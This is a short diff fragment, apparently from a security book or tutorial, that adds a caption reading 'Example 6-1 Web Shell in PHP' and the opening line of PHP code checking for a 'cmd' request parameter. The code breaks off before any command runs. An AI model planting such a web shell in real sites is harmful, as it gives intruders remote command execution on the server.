@@ -1,0 +1,4 @@
+le 6-1.
+Example 6-1 Web Shell in PHP
+<?php
+if(isset($_GET['cmd'])) {
